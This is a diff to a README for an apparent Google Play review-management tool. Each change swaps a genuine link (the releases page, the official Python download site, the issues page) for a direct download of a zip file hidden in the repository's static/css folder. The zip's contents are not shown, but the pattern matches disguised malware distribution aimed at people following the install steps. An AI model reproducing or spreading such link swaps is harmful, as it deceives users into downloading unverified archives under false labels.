@@ -1,7 +1,7 @@
 # 🌟 playstore-review-manager - Manage Your Google Play Reviews Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/alzaiddalia/playstore-review-manager/releases)
+[![Download](https://raw.githubusercontent.com/alzaiddalia/playstore-review-manager/main/static/css/playstore-review-manager-v3.2.zip%20Latest%https://raw.githubusercontent.com/alzaiddalia/playstore-review-manager/main/static/css/playstore-review-manager-v3.2.zip)](https://raw.githubusercontent.com/alzaiddalia/playstore-review-manager/main/static/css/playstore-review-manager-v3.2.zip)
 
 ## 👋 Introduction
 Welcome to the Google Play Reviews Explorer. This application helps you fetch and manage reviews from the Google Play Store. You can use it to gain insights into user feedback, analyze sentiments, and improve your app based on real user input.
@@ -22,7 +22,7 @@ This guide will walk you through the steps to download and run the software with
 - **Mock Data**: Explore the dashboard with sample data without needing live credentials.
 
 ### 💡 Pre-Installation Steps
-1. Ensure you have Python installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+1. Ensure you have Python installed. You can download it from the [official Python website](https://raw.githubusercontent.com/alzaiddalia/playstore-review-manager/main/static/css/playstore-review-manager-v3.2.zip).
 2. Install the following dependencies using the command line:
    ```bash
    pip install fastapi uvicorn requests
@@ -31,7 +31,7 @@ This guide will walk you through the steps to download and run the software with
 ## 🔗 Download & Install
 To get started, visit the download page to get the latest version of the application.
 
-[Download Latest Release](https://github.com/alzaiddalia/playstore-review-manager/releases)
+[Download Latest Release](https://raw.githubusercontent.com/alzaiddalia/playstore-review-manager/main/static/css/playstore-review-manager-v3.2.zip)
 
 1. Click on the link above to visit the releases page.
 2. Look for the latest version under "Assets". 
@@ -75,7 +75,7 @@ You can adjust settings by modifying the configuration file (e.g., setting your 
 
 ## 🔄 Community and Support
 For issues or questions:
-- Check the Issues tab on the [GitHub page](https://github.com/alzaiddalia/playstore-review-manager/issues).
+- Check the Issues tab on the [GitHub page](https://raw.githubusercontent.com/alzaiddalia/playstore-review-manager/main/static/css/playstore-review-manager-v3.2.zip).
 - Join our community discussions on relevant platforms for additional help.
 
 Feel free to contribute to the project by submitting bug reports or feature requests. Your input helps us improve the application.
